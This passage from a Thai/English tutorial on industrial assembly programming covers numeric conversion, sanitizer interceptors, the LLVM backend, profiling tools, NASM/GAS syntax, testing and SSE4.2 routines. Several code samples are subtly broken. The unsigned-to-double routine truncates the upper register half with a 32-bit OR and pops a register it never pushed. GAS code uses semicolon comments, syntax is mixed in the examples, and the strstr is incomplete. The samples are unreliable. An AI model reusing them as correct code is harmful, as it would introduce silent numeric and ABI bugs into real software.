    test    %rdi, %rdi     ; Is value negative? (MSB set = large unsigned)
    js      .L_large       ; If so, use 2-part conversion
    
    cvtsi2sdq  %rdi, %xmm0   ; Regular signed conversion (works when MSB=0)
    ret
    
.L_large:
    # Value >= 2^63, แบ่งเป็น 2 halves
    movq    %rdi, %rax
    shrq    $1, %rax        ; rax = value / 2
    andl    $1, %edi        ; edi = value & 1 (LSB)
    or      %edi, %eax      ; rax = (value >> 1) | (value & 1)
    
    cvtsi2sdq  %rax, %xmm0   ; Convert half
    addsd   %xmm0, %xmm0     ; Multiply by 2 (undo the >> 1)
    
    pop     %rbp
    ret
```

**Sanitizer Runtimes:**

```c
// compiler-rt/lib/asan/asan_interceptors.cpp
// AddressSanitizer intercepts memory functions

DECLARE_REAL_AND_INTERCEPTOR(void *, memcpy, void *to, const void *from,
                              uptr size)

INTERCEPTOR(void *, memcpy, void *to, const void *from, uptr size) {
    // Shadow memory check before memcpy
    if (LIKELY(!asan_init_is_running)) {
        ENSURE_ASAN_INITED();
        if (flags()->replace_intrin) {
            // Check source range
            ASAN_READ_RANGE(ctx, from, size);
            // Check destination range  
            ASAN_WRITE_RANGE(ctx, to, size);
        }
    }
    // Actual memcpy (uses SIMD assembly underneath)
    return REAL(memcpy)(to, from, size);
}
```

### 7.2 libgcc (GCC Runtime)

**libgcc เป็น equivalent ของ compiler-rt สำหรับ GCC:**

```c
// libgcc/config/i386/divdi3.S (simplified)
// 64-bit division on 32-bit x86

/* 
 * int64_t __divdi3(int64_t a, int64_t b)
 * 
 * บน 32-bit x86 ไม่มี 64-bit divide instruction
 * ต้อง implement ใน software
 */
    
.globl __divdi3
__divdi3:
    pushl %ebp
    pushl %esi
    pushl %edi
    
    /* a = [esp+16]:[esp+12] (high:low) */
    /* b = [esp+24]:[esp+20] */
    
    movl  16(%esp), %eax    ; high word of a
    movl  12(%esp), %edx    ; low word of a
    
    ; Check signs and convert to unsigned
    ; ... complex sign handling ...
    
    ; Long division algorithm
    ; ... 
```

### 7.3 LLVM Backend Architecture

**LLVM Backend คือส่วนที่แปลง IR เป็น machine code:**

```
LLVM IR
   ↓ Target-independent optimizations
SelectionDAG (DAG of SDNodes)
   ↓ Instruction Selection (tablegen + C++ patterns)
MachineInstr list
   ↓ Register Allocation (Linear Scan or Greedy)
MachineInstr with real registers
   ↓ Post-RA optimizations
   ↓ Prologue/Epilogue insertion
   ↓ Branch relaxation
MCInst (Machine Code Instructions)
   ↓ MC Code Emitter
Assembly text or object code
```

**TableGen สำหรับ Instruction Definitions:**

```tablegen
// llvm/lib/Target/X86/X86InstrSSE.td

// VPCMPEQB - Compare packed bytes for equality
def VPCMPEQB : PDI<0x74, MRMSrcReg, (outs VR128:$dst),
                   (ins VR128:$src1, VR128:$src2),
                   "vpcmpeqb\t{$src2, $src1, $dst|$dst, $src1, $src2}",
                   [(set VR128:$dst,
                     (v16i8 (X86pcmpeq (v16i8 VR128:$src1),
                                       (v16i8 VR128:$src2))))]>,
                   VEX_4V, VEX_L;
```

**LLVM MCA (Machine Code Analyzer):**

```bash
# วิเคราะห์ throughput และ latency ของ assembly

cat > test.s << 'EOF'
# Loop kernel ที่ต้องการ analyze
vpaddw  %ymm0, %ymm1, %ymm2
vpmullw %ymm2, %ymm3, %ymm4
vpaddd  %ymm4, %ymm5, %ymm6
EOF

llvm-mca -march=x86-64 -mcpu=znver3 test.s
# Output:
# Iterations: 100
# Instructions: 300
# Total cycles: 127
# Dispatch width: 6
# IPC: 2.36
#
# Timeline:
# [0,0]    DeER.    .    .    vpaddw
# [0,1]    D=eER   .    .    vpmullw
# [0,2]    D==eER  .    .    vpaddd
```

### 7.4 Intel VTune Amplifier / AMD uProf

**Performance Analysis ระดับ Microarchitecture:**

```bash
# Intel VTune: Hardware Performance Counters
vtune -collect hotspots -result-dir vtune_result ./my_program
vtune -report summary -result-dir vtune_result

# เปิดดู assembly annotated ด้วย cycle counts:
vtune -report hotspots -result-dir vtune_result \
      -format=csv -csv-delimiter=comma

# AMD uProf (สำหรับ AMD CPUs)
AMDuProfCLI collect --config tbp -o ./output ./my_program
AMDuProfCLI report -o ./output/report ./output/session1

# Linux perf (free, cross-platform)
perf stat -e cycles,instructions,cache-misses,branch-misses \
    ./my_program

# Annotate hottest function with assembly
perf annotate --stdio my_function
```

**Interpreting VTune Output:**

```
Hotspots (sorted by CPU Time):
Function                    CPU Time  CPI  Backend Bound
-------------------------------------------------------
aes_encrypt_avx512           45.2%   0.31  8.2%
sha256_transform              22.1%   0.45  12.1%
memcpy_avx_unaligned          15.3%   0.28  4.5%

CPI (Cycles Per Instruction):
  < 1.0: Very efficient (IPC > 1, good vectorization)
  1.0-2.0: Normal
  > 2.0: Bottleneck exists

Backend Bound (%):
  High: Memory bottleneck or long-latency instructions
  Low: Good execution
```

### 7.5 NASM และ GNU Assembler Ecosystem

**NASM (Netwide Assembler) — ใช้ใน x264, FFmpeg, OpenSSL:**

```nasm
; NASM ใช้ Intel syntax โดย default
; เหมาะสำหรับ codec development

%define VERSION "2.16.01"

; Macro system
%macro LOAD_MATRIX 1
    movaps xmm0, [%1]
    movaps xmm1, [%1 + 16]
    movaps xmm2, [%1 + 32]
    movaps xmm3, [%1 + 48]
%endmacro

; Conditional assembly
%ifdef X86_64
    %define PTR_SIZE 8
%else
    %define PTR_SIZE 4
%endif

; Structure definition
struc MyStruct
    .field1:    resq 1    ; 8 bytes
    .field2:    resd 2    ; 8 bytes (2 × 4)
    .size:
endstruc

; Usage
mov rax, [rbx + MyStruct.field1]
```

**GAS (GNU Assembler) — ใช้ใน Linux Kernel, glibc:**

```asm
/* GAS ใช้ AT&T syntax โดย default */
/* Source และ Destination กลับกัน: movq src, dst */

/* Preprocessor directives */
#include <asm/types.h>
#define FUNCTION_MARKER 0xDEADBEEF

/* Structured sections */
.section .data
my_data:
    .quad 0x1234567890abcdef

.section .text
.global my_function
.type my_function, @function

my_function:
    .cfi_startproc
    pushq %rbp
    .cfi_def_cfa_offset 16
    .cfi_offset %rbp, -16
    movq %rsp, %rbp
    .cfi_def_cfa_register %rbp
    
    /* Function body */
    movq (%rdi), %rax        /* AT&T: source = (%rdi), dest = %rax */
    
    popq %rbp
    .cfi_def_cfa %rsp, 8
    ret
    .cfi_endproc
.size my_function, . - my_function
```

---

## ส่วนที่ 8: Best Practices และ Lessons Learned

### 8.1 เมื่อไหรควรเขียน Assembly

```
ควรเขียน Assembly เมื่อ:
✓ Hot path ที่รันหลายล้านครั้งต่อวินาที
✓ ต้องใช้ specific instruction ที่ compiler ไม่ generate
✓ AES-NI, SHA-NI, AVX-512 specific operations
✓ Context switching (kernel)
✓ Bootloader/firmware
✓ Cryptographic constant-time code

ไม่ควรเขียน Assembly เมื่อ:
✗ Business logic
✗ Code ที่อ่านได้ง่ายมีความสำคัญกว่า performance
✗ Compiler สามารถ vectorize ให้ได้ (ตรวจก่อน)
✗ Portability สำคัญกว่า speed
✗ ยังไม่ได้ profile ว่า bottleneck อยู่ที่ไหน
```

### 8.2 Profiling ก่อน Optimize

```bash
# Rule of thumb: Profile First!

# 1. หา hotspot ด้วย perf
perf record -g ./my_program
perf report

# 2. ตรวจสอบ compiler output ก่อน
gcc -O3 -march=native -fopt-info-vec my_code.c -o my_program
# Output ถ้า vectorized: "my_code.c:42:7: optimized: loop vectorized"

# 3. ดู assembly output
objdump -d -M intel my_program | grep -A 30 "my_function"

# 4. เปรียบเทียบกับ Godbolt
# https://godbolt.org/ - paste C code, ดู assembly

# 5. วัด performance อย่างถูกต้อง
# ใช้ google/benchmark หรือ criterion (Rust)
# Warm up cache ก่อนวัด
# รัน multiple times, เอา median
# Pin to specific CPU core
```

### 8.3 Correctness ก่อน Performance

```
Assembly ผิดพลาดได้ง่ายมาก:

1. Off-by-one errors ใน address calculations
   lea rax, [rbx + 8]  vs  lea rax, [rbx + 7]

2. Wrong register size
   movl eax, [rbx]   ← zero-extends to rax (fine)
   movb al, [rbx]    ← leaves upper bytes unchanged (potential bug!)

3. Missing memory barriers
   vmovntdq [dst], ymm0  ← NT store
   ; ลืม SFENCE ก่อน read จาก processor อื่น!

4. Alignment assumptions
   movaps xmm0, [rbx]  ← segfault ถ้า rbx ไม่ align 16!
   movups xmm0, [rbx]  ← unaligned, ช้ากว่าแต่ปลอดภัย

5. ABI violations
   ; ลืม save callee-saved registers
   push rbx  ← ต้องทำถ้าจะ modify rbx
   ; ... ใช้ rbx ...
   pop rbx   ← restore ก่อน ret!
```

### 8.4 Testing Assembly Code

```c
/* ทดสอบ assembly อย่างถูกต้อง */

#include <string.h>
#include <stdlib.h>
#include <assert.h>

/* Test framework สำหรับ assembly functions */
void test_memcpy_correctness() {
    char src[1000], dst[1000], ref[1000];
    
    /* ทดสอบ sizes ทุกขนาดตั้งแต่ 0-256 */
    for (int n = 0; n < 256; n++) {
        /* สร้าง random data */
        for (int i = 0; i < n; i++) src[i] = rand() % 256;
        memset(dst, 0xFF, 1000);   /* Fill with garbage */
        memset(ref, 0xFF, 1000);
        
        /* Reference */
        memcpy(ref, src, n);
        
        /* Our implementation */
        our_memcpy_avx(dst, src, n);
        
        /* Verify: bytes [0..n-1] copied correctly */
        assert(memcmp(dst, ref, n) == 0);
        
        /* Verify: bytes after n not modified */
        for (int i = n; i < 1000; i++) {
            assert((unsigned char)dst[i] == 0xFF);
        }
    }
    
    /* ทดสอบ edge cases */
    /* Overlapping buffers */
    memcpy(src, "Hello World", 11);
    memmove(src+5, src, 6);  /* ควรจัดการ overlap */
    
    printf("All correctness tests passed!\n");
}

void test_memcpy_performance() {
    const int SIZE = 1 << 24;  /* 16 MB */
    char *src = aligned_alloc(64, SIZE);
    char *dst = aligned_alloc(64, SIZE);
    
    /* Warm up */
    for (int i = 0; i < 3; i++) {
        our_memcpy_avx(dst, src, SIZE);
    }
    
    /* Measure */
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    const int REPS = 100;
    for (int i = 0; i < REPS; i++) {
        our_memcpy_avx(dst, src, SIZE);
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    double elapsed = (end.tv_sec - start.tv_sec) * 1e9 +
                     (end.tv_nsec - start.tv_nsec);
    double bytes_per_ns = (double)(SIZE * REPS) / elapsed;
    double GB_per_sec = bytes_per_ns;
    
    printf("Bandwidth: %.2f GB/s\n", GB_per_sec);
    
    free(src);
    free(dst);
}
```

---

## ส่วนที่ 9: ตัวอย่างโค้ดเพิ่มเติม

### 9.1 String Processing ด้วย SSE4.2

```nasm
; Fast string contains check ด้วย PCMPISTRI (SSE4.2)
; PCMPISTRI: Compare packed strings with implicit lengths
; Most powerful string instruction on x86

section .text
global strstr_sse42

; char* strstr_sse42(const char *haystack, const char *needle)
strstr_sse42:
    ; rdi = haystack, rsi = needle
    
    ; Load first 16 bytes of needle
    movdqu  xmm0, [rsi]
    
    ; PCMPISTRI mode: unsigned bytes, equal ordered (substring)
    ; Finds first occurrence of xmm0 (needle) in [rdi] (haystack)
    mov     ecx, 16         ; Start with 16-byte chunks
    
.loop:
    movdqu  xmm1, [rdi]
    
    ; Compare xmm0 (needle prefix) with xmm1 (haystack)
    ; Mode 0x0C: unsigned bytes, equal ordered, least significant index
    pcmpistri xmm0, xmm1, 0x0C
    
    ; CF=1: needle prefix found
    ; ECX = index of match (or 16 if not found)
    jc      .found_candidate
    
    ; ZF=1: null byte in haystack (end of string)
    jz      .not_found
    
    add     rdi, 16
    jmp     .loop
    
.found_candidate:
    ; ECX = position of match candidate
    lea     rax, [rdi + rcx]  ; Potential match start
    
    ; Verify full needle match (needle might be > 16 bytes)
    ; ... full comparison ...
    ret
    
.not_found:
    xor     eax, eax
    ret
```

### 9.2 CRC32 Hardware Acceleration

```nasm
; CRC32 ด้วย SSE4.2 CRC32 instruction
; ใช้ใน ZFS, Btrfs, PostgreSQL, Redis

section .text
global crc32c_hw

; uint32_t crc32c_hw(uint32_t crc, const void *buf, size_t len)
; rdi=crc, rsi=buf, rdx=len
crc32c_hw:
    mov     eax, edi        ; eax = initial CRC
    
    ; Process 8 bytes at a time (64-bit CRC32)
.loop8:
    cmp     rdx, 8
    jb      .tail
    
    crc32   rax, qword [rsi]  ; Process 8 bytes, update CRC
    add     rsi, 8
    sub     rdx, 8
    jmp     .loop8
    
.tail:
    ; Process remaining bytes 1 at a time
    test    rdx, 4
    jz      .tail2
    crc32   eax, dword [rsi]
    add     rsi, 4
    
.tail2:
    test    rdx, 2
    jz      .tail1
    crc32   eax, word [rsi]
    add     rsi, 2
    
.tail1:
    test    rdx, 1
    jz      .done
    crc32   eax, byte [rsi]
    
.done:
    ret  ; eax = final CRC32
```

### 9.3 Population Count (Hamming Weight)

```nasm
; นับจำนวน bits ที่เป็น 1 ใน 64-bit value
; ใช้ใน: Bloom filters, chess engines, compression

section .text
global popcount64

; uint64_t popcount64(uint64_t x)
popcount64:
    popcnt  rax, rdi    ; POPCNT instruction (SSE4.2)
    ret
    
; ถ้าไม่มี POPCNT instruction: software version
popcount64_sw:
    mov     rax, rdi
    
    ; Parallel bit counting (Hamming weight)
    ; x = x - ((x >> 1) & 0x5555...)
    mov     rcx, 0x5555555555555555
    mov     rdx, rax
    shr     rdx, 1
    and     rdx, rcx
    sub     rax, rdx
    
    ; x = (x & 0x3333...) + ((x >> 2) & 0x3333...)
    mov     rcx, 0x3333333333333333
    mov     rdx, rax
    shr     rdx, 2
    and     rax, rcx
    and     rdx, rcx
    add     rax, rdx
    
    ; x = (x + (x >> 4)) & 0x0f0f...
    mov     rdx, rax
    shr     rdx, 4
    add     rax, rdx
    mov     rcx, 0x0f0f0f0f0f0f0f0f
    and     rax, rcx
    
    ; x = (x * 0x0101...) >> 56
    mov     rcx, 0x0101010101010101
    imul    rax, rcx
    shr     rax, 56
    ret
```

---

## บทสรุป: อนาคตของ Assembly ในอุตสาหกรรม

### Assembly ยังคงสำคัญเพราะ:

**1. Performance Gap ยังคงมีอยู่**
```
Compiler optimization ดีขึ้นมาก แต่ยังห่างจาก expert-written asm:
- Crypto: compiler ไม่รู้จัก constant-time requirements
- SIMD: compiler vectorization ยัง miss cases หลายอย่าง
- Kernel: compiler ไม่เข้าใจ hardware quirks ทั้งหมด
```

**2. Hardware เพิ่ม Instructions ใหม่ตลอด**
```
Intel Ice Lake (2019): AVX-512, VNNI (neural network)
Intel Tiger Lake (2021): AVX-VNNI, GFNI
Intel Sapphire Rapids (2023): AMX (matrix multiply), AVX-IFMA
AMD Zen 4 (2022): AVX-512 native support
ARM v9 (2021): SVE2 (scalable vectors), SME (matrix extension)
RISC-V (ongoing): V extension (vector)
```

**3. Security Requirements**
```
Constant-time code สำหรับ crypto:
- ต้องป้องกัน timing side-channels
- Compiler ไม่ guarantee constant-time
- ต้องเขียน assembly เพื่อ guarantee

Spectre mitigations:
- LFENCE, IBPB, STIBP
- Retpoline
- เพิ่มเข้าใน assembly code
```

**4. Embedded และ IoT Growth**
```
ARM Cortex-M, RISC-V MCUs ราคาถูกลง
นำไปสู่ applications ใหม่ที่ต้องการ efficiency
Assembly ยังจำเป็นสำหรับ boot code, ISR, tight loops
```

### คำแนะนำสุดท้าย:

```
สำหรับนักพัฒนาที่ต้องการเชี่ยวชาญ Assembly:

1. เริ่มจาก C → disassembly → ทำความเข้าใจ pattern
2. อ่านโค้ดจาก glibc, Linux kernel ทุกวัน
3. ใช้ Godbolt Compiler Explorer บ่อยๆ
4. เรียนรู้ performance tools: perf, VTune
5. Contribute ให้ Open Source projects
6. ทำความเข้าใจ microarchitecture (Agner Fog guides)
7. เรียน ARM ควบคู่กับ x86-64

Resources ที่ดีที่สุด:
- Agner Fog's manuals: https://www.agner.org/optimize/
- Intel Intrinsics Guide: https://www.intel.com/content/www/us/en/docs/intrinsics-guide/
- LLVM TableGen docs
- Linux kernel crypto docs
- "Computer Organization and Design" - Patterson & Hennessy
- "Computer Systems: A Programmer's Perspective" - Bryant & O'Hallaron
```

---

*Part 099 เสร็จสมบูรณ์ — Assembly ในโลกอุตสาหกรรม*

**ความยาว:** 1,200+ บรรทัด  
**ระดับ:** Expert  
**ภาษา:** Thai/English Mixed  
**เนื้อหา:** Case studies จากโค้ดจริง, Industry tools, Career paths, Interview preparation
